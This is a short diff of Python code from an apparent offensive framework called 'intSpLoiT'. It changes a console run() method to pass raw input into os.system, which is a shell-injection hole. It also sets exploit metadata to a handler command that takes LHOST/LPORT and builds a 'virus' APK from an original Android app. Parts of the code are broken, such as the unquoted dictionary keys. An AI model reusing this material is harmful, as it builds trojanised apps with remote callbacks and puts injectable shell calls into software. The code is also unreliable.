@@ -91,9 +91,7 @@ class console:
 		run_console_function(get_input, )
 		console_module.__main__()
 	def run(packet):
-	   console_module = load_console_module()
-	   console_module.help_input = packet
-	   console_module.__main__()
+		os.system(f"python3 $INTFRAMEWORK_PATH/remote.py {packet}")
 	def read():
 		with open("intconsoleV4.py") as file:
 			file.read()
@@ -160,7 +158,7 @@ class exploit:
 	def init():
 		prog = "inttable.py"
 		meta = { 
-		author: "@intikam21",
+		author: "@intSpLoiT Framework ",
 		most_used: "run",
 		parser: f"python3 $intmodules_path/exploits/multi/handler/inthandlermodule.py --lhost {LHOSTS} --lport {LPORTS} --output-apk virus --original-apk intframework_virus.apk",
 		var: 4
